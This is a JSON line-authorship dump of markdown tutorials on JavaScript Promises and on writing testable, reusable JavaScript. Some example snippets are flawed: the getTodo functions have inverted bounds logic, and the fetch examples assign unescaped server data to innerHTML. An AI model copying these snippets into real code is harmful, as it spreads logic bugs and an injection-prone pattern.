        "content": "      xhr.open(\"GET\", url);"
      },
      {
        "lineNumber": 221,
        "author": {
          "gitId": "-"
        },
        "content": "      xhr.onload \u003d () \u003d\u003e resolve(xhr.responseText);"
      },
      {
        "lineNumber": 222,
        "author": {
          "gitId": "-"
        },
        "content": "      xhr.onerror \u003d () \u003d\u003e reject(xhr.statusText);"
      },
      {
        "lineNumber": 223,
        "author": {
          "gitId": "-"
        },
        "content": "      xhr.send();"
      },
      {
        "lineNumber": 224,
        "author": {
          "gitId": "-"
        },
        "content": "    });"
      },
      {
        "lineNumber": 225,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 226,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 227,
        "author": {
          "gitId": "-"
        },
        "content": "  fetchPage(\u0027path/to/resource\u0027)"
      },
      {
        "lineNumber": 228,
        "author": {
          "gitId": "-"
        },
        "content": "      .then(response \u003d\u003e console.log(response))"
      },
      {
        "lineNumber": 229,
        "author": {
          "gitId": "-"
        },
        "content": "      .catch(err \u003d\u003e console.log(err));"
      },
      {
        "lineNumber": 230,
        "author": {
          "gitId": "-"
        },
        "content": "  ```"
      },
      {
        "lineNumber": 231,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 232,
        "author": {
          "gitId": "-"
        },
        "content": "* **Disk I/O**"
      },
      {
        "lineNumber": 233,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 234,
        "author": {
          "gitId": "-"
        },
        "content": "  Reading a file, especially a large one may take some time to complete. If we were to use a synchronous file reading function, the rest of your program wouldn\u0027t be able to run because it is stuck waiting for the file to be read. Instead, we can use asynchronous file reading functions which allow for background loading of the file, whilst keeping your program humming along."
      },
      {
        "lineNumber": 235,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 236,
        "author": {
          "gitId": "-"
        },
        "content": "  ```javascript"
      },
      {
        "lineNumber": 237,
        "author": {
          "gitId": "-"
        },
        "content": "  const fs \u003d require(\u0027fs\u0027);   // this is the in-built filesystem module from Node.js"
      },
      {
        "lineNumber": 238,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 239,
        "author": {
          "gitId": "-"
        },
        "content": "  function readFileWithPromise(filePath) {"
      },
      {
        "lineNumber": 240,
        "author": {
          "gitId": "-"
        },
        "content": "      return new Promise(function(resolve, reject) {"
      },
      {
        "lineNumber": 241,
        "author": {
          "gitId": "-"
        },
        "content": "          fs.readFile(filePath, \u0027utf8\u0027, function(err, data) {"
      },
      {
        "lineNumber": 242,
        "author": {
          "gitId": "-"
        },
        "content": "              if (err) {"
      },
      {
        "lineNumber": 243,
        "author": {
          "gitId": "-"
        },
        "content": "                  reject(err);"
      },
      {
        "lineNumber": 244,
        "author": {
          "gitId": "-"
        },
        "content": "              } else {"
      },
      {
        "lineNumber": 245,
        "author": {
          "gitId": "-"
        },
        "content": "                  resolve(data);"
      },
      {
        "lineNumber": 246,
        "author": {
          "gitId": "-"
        },
        "content": "              }"
      },
      {
        "lineNumber": 247,
        "author": {
          "gitId": "-"
        },
        "content": "          });"
      },
      {
        "lineNumber": 248,
        "author": {
          "gitId": "-"
        },
        "content": "      })"
      },
      {
        "lineNumber": 249,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 250,
        "author": {
          "gitId": "-"
        },
        "content": "  };"
      },
      {
        "lineNumber": 251,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 252,
        "author": {
          "gitId": "-"
        },
        "content": "  readFileWithPromise(\u0027path/to/file\u0027)"
      },
      {
        "lineNumber": 253,
        "author": {
          "gitId": "-"
        },
        "content": "      .then(data \u003d\u003e console.log(data))"
      },
      {
        "lineNumber": 254,
        "author": {
          "gitId": "-"
        },
        "content": "      .catch(err \u003d\u003e console.log(err));"
      },
      {
        "lineNumber": 255,
        "author": {
          "gitId": "-"
        },
        "content": "  ```"
      },
      {
        "lineNumber": 256,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 257,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Doing More With Promises"
      },
      {
        "lineNumber": 258,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 259,
        "author": {
          "gitId": "-"
        },
        "content": "Sometimes multiple promises may have to be used at a time, and Javascript provides excellent support with the `Promise.all` and `Promise.race` functions."
      },
      {
        "lineNumber": 260,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 261,
        "author": {
          "gitId": "-"
        },
        "content": "If multiple asynchronous operations have to be performed, and these operations are independent in that they do not rely on each other\u0027s values, `Promise.all()`can be used to execute all these operations at a go. It takes in an array of Promises and returns either an array with all the resolved values, or the value of the first rejected Promise. After which, `then()` which was previously mentioned, can be used to act on all these resolved values."
      },
      {
        "lineNumber": 262,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 263,
        "author": {
          "gitId": "-"
        },
        "content": "There is an excellent write up on these methods [here](https://davidwalsh.name/promises), which go through how best to use these functions."
      },
      {
        "lineNumber": 264,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 265,
        "author": {
          "gitId": "-"
        },
        "content": "In addition, there are other libraries such as [Bluebird](http://bluebirdjs.com/docs/getting-started.html) and [Q](https://github.com/kriskowal/q) which offer even more functionality such as Promise monitoring and synchronous inspection of Promises."
      },
      {
        "lineNumber": 266,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 267,
        "author": {
          "gitId": "-"
        },
        "content": "## Further Reading"
      },
      {
        "lineNumber": 268,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 269,
        "author": {
          "gitId": "-"
        },
        "content": "You may read more about Promises, and how to use them at the following pages:"
      },
      {
        "lineNumber": 270,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 271,
        "author": {
          "gitId": "-"
        },
        "content": "- [JavaScript Promises: an Introduction](https://developers.google.com/web/fundamentals/primers/promises)"
      },
      {
        "lineNumber": 272,
        "author": {
          "gitId": "-"
        },
        "content": "- [JavaScript Promises for Dummies](https://scotch.io/tutorials/javascript-promises-for-dummies)"
      },
      {
        "lineNumber": 273,
        "author": {
          "gitId": "-"
        },
        "content": "- [Javascript Async/Await](https://javascript.info/async-await)"
      },
      {
        "lineNumber": 274,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 275,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 2,
      "-": 273
    }
  },
  {
    "path": "contents/javascript/WritingTestableJavascript.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Writing Testable Javascript"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Writing Testable Javascript"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: Li Kai"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "* [Writing testable JavaScript‎](#writing-testable-javascript-2)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Avoid coupling with selectors‎](#avoid-coupling-with-selectors)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Split business logic and presentation code‎](#split-business-logic-and-presentation-code)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Avoid big anonymous functions‎](#avoid-big-anonymous-functions)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Purity is worth pursuing‎](#purity-is-worth-pursuing)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "* [Writing reusable javascript‎](#writing-reusable-javascript)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Optional parameters‎](#optional-parameters)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Understand method chaining‎](#understand-method-chaining)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Addendum‎](#addendum)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "* [Resources‎](#resources)"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "* [References‎](#references)"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "JavaScript is a powerful language. However, its flexibility leads to multiple ways for people to go about doing the same thing. The end result is that multiple collaborators working on a single project can produce different code that does the same thing."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "That is why there is a need to follow a standard way of writing JavaScript - it allows for more maintainable cleaner and more beautiful code."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "Good JavaScript code should be testable and reusable."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Writing Testable JavaScript"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Avoid Coupling With Selectors"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "When writing front end code we would encounter code that manipulates the document object model (DOM). Let\u0027s look at one such example."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "openorclose"
        },
        "content": "var DIV_STATUS_MESSAGE_SELECTOR \u003d \u0027#statusMessagesToUser\u0027;"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "function populateStatusMessageDiv(message, status) {"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    var statusMessageDivToUser \u003d document.querySelector(DIV_STATUS_MESSAGE_SELECTOR);"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "In this piece of code, we see that the selector is intrinsically tied to the function. This means that the function is tightly tied with the selector and is not easily testable as the test code has to generate the same markup in the test suite for the function to hook up to. In order to prevent such tight coupling, it is advised to leave the selector as a parameter, or sometimes, simply pass in the element itself."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "function populateStatusMessage(selector, message, status) {"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    var statusMessageDivToUser \u003d document.querySelector(selector);"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Split Business Logic and Presentation Code"
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "When we have to write code that generates markup, it requires business logic. However, mixing the two up is not a good idea. Let\u0027s look at the following example:"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "openorclose"
        },
        "content": "fetch("
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  \u0027/admin/adminStudentGoogleIdReset?\u0027 + params,"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  { method: \u0027POST\u0027 }"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "openorclose"
        },
        "content": ")"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  .then(data \u003d\u003e {"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    document.getElementById(\u0027result\u0027).innerHTML \u003d data;"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  })"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  .catch(error \u003d\u003e {"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    document.getElementById(\u0027error\u0027).innerHTML \u003d"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "openorclose"
        },
        "content": "        \u0027An error occurred, please Retry\u0027;"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "  });"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "It order to test such a function, we would now have to incorporate both logic and also the mock-up generated. Splitting the logic and markup into two separate functions will both make it easier to test and composable because now you can reuse code that generates the markup in multiple places."
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "openorclose"
        },
        "content": "function processData(data) {"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    document.getElementById(\u0027result\u0027).innerHTML \u003d data;"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "openorclose"
        },
        "content": "function handleError(error) {"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "openorclose"
        },
        "content": "    document.getElementById(\u0027error\u0027).innerHTML \u003d"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "openorclose"
        },
        "content": "      \u0027An error occurred, please Retry\u0027;"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "openorclose"
        },
        "content": "fetch("
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  \u0027/admin/adminStudentGoogleIdReset?\u0027 + params,"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  { method: \u0027POST\u0027 }"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "openorclose"
        },
        "content": ")"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  .then(processData)"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "openorclose"
        },
        "content": "  .catch(handleError);"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "Already, we are seeing some of the patterns that lead to the MVC, albeit in a very small scale."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Avoid Big Anonymous Functions"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "openorclose"
        },
        "content": "Although anonymous functions can lead to cleaner and shorter code, critical business logic should not be written in anonymous functions. The lack of namespace makes them impossible to test. This is common, and tempting when the code starts off with a listener for the `DOMContentLoaded` event."
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "The testable way of writing such function is to simply give the function a name, which allows it to be tested."
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "openorclose"
        },
        "content": "document.addEventListener(\"DOMContentLoaded\", function(event) { "
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "  bindStudentPhotoLink(\u0027.profile-pic-icon-view-link\u0027);"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "});"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "function bindStudentPhotoLink(selector) {"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "Of course, this may be a problem if two Javascript functions have the same name, as they are all in the global scope. This is where the module pattern (see: [Namespacing in Javascript]()) can be used."
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "var myApp \u003d (function() {"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "    var id\u003d 0;"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "    return {"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "        next: function() {"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "            return id++;"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "        },"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "        reset: function() {"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "            id \u003d 0;"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "        }"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "    };"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "})();"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "As demonstrated above, only `myApp` is declared in the global scope, and we can access its methods through the object notation, e.g. `myApp.next()`. This is also especially useful to declare private variables that be used among functions. `id` is not accessible outside of scope in this example."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Purity is Worth Pursuing"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "There are tonnes of literature about functional programming. I will heavily recommend reading the [Mostly adequate guide to Functional Programming](https://github.com/MostlyAdequate/mostly-adequate-guide). It explains functional concepts extremely well."
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "The benefit of pure functions is simple, there is no need to keep track of state. Given an input, the output is guaranteed to be the same every time. This allows us to write extremely simple unit tests, instead of having to maintain the state while testing."
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "var counter \u003d 0;"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "var todos \u003d [];"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "function getTodo() {"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "    counter++;"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "    if (counter \u003c todos.length) {"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "        return \u0027NIL\u0027;"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "    return todos[counter];"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "..."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "getTodo();"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "The above function `getTodo` is not stateless as it depends on counter\u0027s value. In order to write the tests, we would need to ensure counter is reset to the same value at the end of each test. A better way would be to do this:"
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "var counter \u003d 0;"
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": "var todos \u003d [];"
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": "function getTodo(counter, todos) {"
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "    if (counter \u003c todos.length) {"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": "        return \u0027NIL\u0027;"
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": "    return todos[counter + 1];"
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": "..."
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "getTodo(counter, todos);"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "Now, not only that the person who writes the unit test can write in fewer lines of code, you can also use the function for some other state other than the global values."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Writing Reusable Javascript"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Optional Parameters"
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "When writing certain functions, there would be certain situations where we want to have optional parameters. The easiest way would be to put optional parameters at the end of the parameter calls, like such:"
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "// es5 syntax"
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": "function createPopUp(title, content, status, headerColor, bodyColor) {"
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "    var headerColor \u003d headerColor || \u0027default\u0027;"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": "    var bodyColor \u003d bodyColor || \u0027default\u0027;"
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "// es6 syntax default parameters"
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "function createPopUp(title, content, status, headerColor \u003d \u0027default\u0027, bodyColor \u003d \u0027default\u0027) {"
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "    ..."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": " This is relatively simple and easy to understand. However, in order to specify body color, the user would have to know and fill in the default header color."
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": "```js"
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "// es5 syntax"
      },
      {
        "lineNumber": 201,
        "author": {
          "gitId": "-"
        },
        "content": "function createPopUp(title, content, status, optionals) {"
      },
      {
